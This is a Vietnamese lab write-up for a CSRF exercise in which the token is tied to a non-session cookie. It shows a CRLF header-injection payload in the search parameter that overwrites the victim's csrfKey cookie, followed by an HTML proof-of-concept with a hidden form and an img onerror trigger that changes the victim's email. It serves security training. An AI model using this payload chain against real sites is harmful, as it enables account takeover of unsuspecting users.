# CSRF where token is tied to non-session cookie

### Yêu cầu: Tạo thẻ HTML để tấn công CSRF thay đổi email của tài khoản người dùng

### Hướng làm: 

Ở đây chúng ta có 2 tài khoản có vai trò như nhau để sử dụng cho việc tấn công. 

Giả sử `wiener:peter` là nạn nhân còn `carlos:montoya` là người tấn công, ta sẽ làm thay đổi email của tài khoản `wiener`

Đầu tiên ta sẽ đăng nhập vào tài khoản của `wiener` để bắt request.

![image](https://user-images.githubusercontent.com/72268643/157825413-5bf30232-67fb-41cc-b9ef-33c45711578e.png)

Ta có giá trị token của `wiener`: 

`session=mZ6Y1jPzy7B8Drj3NbRobcdyMumnbt2J` `csrfKey=sxRjr2fxtc8LqrIeYq2lMHVfd9qXy9Hf` `csrf=qVkhiR4WkC5YRZe9jGo0ixFYJjzK7E4z`

Làm tương tự (mở tab ẩn danh) ta có giá trị token của `carlos`: 

`session=6d7PCfOaX2sDc9OTWo3cHlycAGUlaXdZ` `csrfKey=WAahHg66n8H2xWy7DrxZqAiIv7ntuQJV` `csrf=b3P3hSElLLLXAQnrIyQixNtbqE1Rh2oa`

Ở lab này, các giá trị token `csrf` được xác thực với giá trị phiên `csrfKey` khi thực hiện các thao tác trong phiên đăng nhập của người dùng. Tuy nhiên, 2 giá trị đó lại không phụ thuộc vào giá trị phiên `session` . Vậy nên để có thể tấn công, ta sẽ phải ghi đè lên biến `csrfKey` của `wiener` bằng giá trị của `csrfKey` của `carlos` rồi thực hiện tấn công.

Thêm 1 điều nữa: so với các lab trước thì ta thấy lab này có thêm công cụ search. Để ý tới các cookie thì hiện tại ta có 2 cookies là:

![image](https://user-images.githubusercontent.com/72268643/157827403-686adee5-c62f-4cd4-8af9-23345a6aba30.png)

Sau khi thực hiện search với 1 từ khóa bất kì, ta thấy xuất hiện thêm 1 cookie ghi lại từ cuối cùng chúng ta search:

![image](https://user-images.githubusercontent.com/72268643/157827617-4fed5e56-4cf9-452a-8f32-3eae3c1a7c8d.png)

Vậy là trang web này đã tạo thêm được cookie. Qua đó, ta có thể thực hiện việc đặt giá trị mới cho các cookies.

Đầu tiên ta sẽ bắt request search đó. Sau đó thêm vào câu lệnh `%0d%0aSet-Cookie:%20csrfKey=WAahHg66n8H2xWy7DrxZqAiIv7ntuQJV` để ghi đè giá trị `csrfKey`. ta được kết quả:

![image](https://user-images.githubusercontent.com/72268643/157829941-a0d813bf-3165-4582-85cd-fd700a8fd315.png)

Vậy là ghi đè thành công. Khi thực hiện viết PoC, ta sẽ thêm 1 thẻ `img` để thực hiện việc ghi đè này như sau: 
```
<html>
  <body>
    <h1>Hello World</h1> <!-- Phần được hiển thị-->
    <iframe style="display:none;" name="csrf-iframe"></iframe> <!-- Để ẩn thẻ form khi hiển thị tới nạn nhân -->
    <form action="nơi_khai_thác_CSRF_ở_trên_trang_web_đó" method="POST" id="csrf-form">
      <input type="hidden" name="email" value="email_mà_bạn_muốn_đổi">
      <input type="hidden" name="csrf" value="token_của_người_tấn_công" />
    </form>
    <img style="display:none;" src="đường_link_thực_hiện_việc_ghi_đè_csrfKey" onerror="document.forms[0].submit()"> <!-- Thẻ này chứa link việc ghi đè csrfKey và dùng event onerror để thực hiện hành vi đó -->
  </body>
</html>
```

Sau đấy gửi lên phía server và gửi cho nạn nhân để hoàn thành lab.
